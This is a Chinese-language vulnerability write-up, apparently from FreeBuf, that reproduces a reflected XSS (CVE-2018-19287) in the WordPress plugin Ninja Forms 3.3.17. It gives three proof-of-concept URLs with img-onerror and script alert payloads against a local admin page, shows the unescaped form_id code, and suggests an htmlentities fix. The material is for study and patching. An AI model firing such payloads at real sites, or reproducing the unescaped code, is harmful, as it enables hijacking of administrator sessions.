***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

![1.png](https://image.3001.net/images/20181125/1543122757_5bfa2f456768c.png!small)

## 前言

 **Ninja
Forms是WordPress的终极免费表单创建工具。使用简单但功能强大的拖放式表单创建器在几分钟内构建表单。对于初学者，可以快速轻松地设计复杂的表单，绝对没有代码。对于开发人员，利用内置的钩子，过滤器，甚至自定义字段模板，使用Ninja
Forms作为框架，在表单构建或提交的任何步骤中执行您需要的任何操作。**

Ninja Forms 3.3.17被爆出存在XSS漏洞（CVE-2018-19287）后，官方还是很给力的发布了3.3.18版本。

## 漏洞复现

### 环境搭建过程

环境：windows10 x64、phpstudy2016、火狐浏览器、wordpress4.4、Ninja Forms 3.3.17。

Ninja Forms作为wordpress的插件，我们得先安装一下wordpress。

安装过程这里就不多说了，不会的小伙伴，可以参考下面的链接。

<https://jingyan.baidu.com/article/a3a3f811c525038da3eb8a49.html>

下图是安装成功，程序首页的图：

![2.png](https://image.3001.net/images/20181125/1543122757_5bfa2f454d1c5.png!small)

然后安装插件Ninja Forms 3.3.17，由于它最新版本是3.3.18，所以不能在后台直接安装Ninja Forms，下载下来的是3.3.18的。

我们可以通过本地安装插件的方式进行，下面是Ninja Forms 3.3.17下载地址：

<https://downloads.wordpress.org/plugin/ninja-forms.3.3.17.zip>

下载完成后，复制压缩包内的ninja forms目录到wordpress程序的安装目录下的/wp-content/pluginsss目录下。如下图所示：

![3.png](https://image.3001.net/images/20181125/1543122757_5bfa2f454bc15.png!small)

完成上一步之后，我们还需要进入后台去启用这个插件。如下图所示：![4.png](https://image.3001.net/images/20181125/1543122757_5bfa2f458f6bb.png!small)

经过重新登录和刷新之后。后台页面多了一个Ninja
Forms，如下图所示：![5.png](https://image.3001.net/images/20181125/1543122757_5bfa2f45b94ae.png!small)

到这里就结束了环境搭建的过程了。

### 复现过程

下面是我从exploit-db上复制的POC，为了方便判断，修改了弹窗的内容。

    
    
    POC1:
    
    http://127.0.0.1/wp-admin/edit.php?s&post_status=all&post_type=nf_sub&action=-1&form_id=1&nf_form_filter&begin_date&end_date="><img+src=mtk+onerror=alert(/POC1/);//&filter_action=Filter&paged=1&action2=-1
    
    
    POC2:
    
    http://127.0.0.1/wp-admin/edit.php?s&post_status=all&post_type=nf_sub&action=-1&form_id=1&nf_form_filter&begin_date="><img+src=mtk+onerror=alert(/POC2/);//&end_date&filter_action=Filter&paged=1&action2=-1
    
    
    POC3:
    
    http://127.0.0.1/wp-admin/edit.php?post_status=trash&post_type=nf_sub&form_id=1"><script>alert(/POC3/);</script>&nf_form_filter&paged=1

我们只要直接复制POC到浏览器的地址栏回车即可触发漏洞。

下图是触发第一个POC的图：

![6.png](https://image.3001.net/images/20181125/1543123092_5bfa30949b1bc.png!small)下图是触发第二个POC的图：

![7.png](https://image.3001.net/images/20181125/1543122757_5bfa2f45ed322.png!small)

下图是触发第三个POC的图：![8.png](https://image.3001.net/images/20181125/1543122758_5bfa2f462af1a.png!small)

到这里，复现的过程也结束了。

下面，我们就进入漏洞分析的过程。

## 漏洞分析过程

笔者直接从POC方面入手，简单分析一下漏洞的成因。由于方法是一样的，笔者是一个懒人，这里就只分析了POC3的成因。

通过POC查找关键词nf_sub，确定了核心文件\wp-content\plugins\ninja-forms\includes\Admin\Menus\Submissions.php。

下图是Submissions.php部分内容：

![9.png](https://image.3001.net/images/20181125/1543122758_5bfa2f4655f57.png!small)

通过粗略的阅读，发现这个函数是导致POC3成功弹窗的关键。

下图是Submissions.php文件第71-104行内容：

    
    
    public function change_views( $views )
    
        {
    
            // Remove our unused views.
    
            unset( $views[ 'mine' ] );
    
            unset( $views[ 'publish' ] );
    
            // If the Form ID is not empty...
    
            if( ! empty( $_GET[ 'form_id' ] ) ) {
    
                // ...populate the rest of the query string.
    
                $form_id = '&form_id=' . $_GET[ 'form_id' ] . '&nf_form_filter&paged=1';
    
            } else {
    
                // ...otherwise send in an empty string.
    
                $form_id = '';
    
            }
    
            // Build our new views.
    
            $views[ 'all' ] = '<a href="' . admin_url( 'edit.php?post_status=all&post_type=nf_sub'  ) . $form_id . '">'
    
                            . __( 'Completed', 'ninja-forms' ) . '</a>';
    
            $views[ 'trash' ] = '<a href="' . admin_url( 'edit.php?post_status=trash&post_type=nf_sub' ) . $form_id . '">'
    
                                . __( 'Trashed', 'ninja-forms' ) . '</a>';
    
            // Checks to make sure we have a post status.
    
            if( ! empty( $_GET[ 'post_status' ] ) ) {
    
                // Depending on the domain set the value to plain text.
    
                if ( 'all' == $_GET[ 'post_status' ] ) {
    
                    $views[ 'all' ] = __( 'Completed', 'ninja-forms' );
    
                } else if ( 'trash' == $_GET[ 'post_status' ] ) {
    
                    $views[ 'trash' ] = __( 'Trashed', 'ninja-forms' );
    
                }
    
            }
    
            return $views;
    
        }
    

从上面代码，我们可以看到，form_id并没有被过滤，导致XSS存在。

    
    
    $form_id = '&form_id=' . $_GET[ 'form_id' ] . '&nf_form_filter&paged=1';
    

## 修复建议

1、利用htmlentities()等函数转义html实体。

    
    
    $form_id = '&form_id=' . htmlentities($_GET[ 'form_id' ]) . '&nf_form_filter&paged=1';
    

再次访问POC3地址，无法触发XSS漏洞。

![10.png](https://image.3001.net/images/20181125/1543122758_5bfa2f46624ce.png!small)

2、升级最新版本。

## 参考链接

<https://www.exploit-db.com/exploits/45880/>

 ***本文作者：看不尽的尘埃，转载请注明来自FreeBuf.COM**

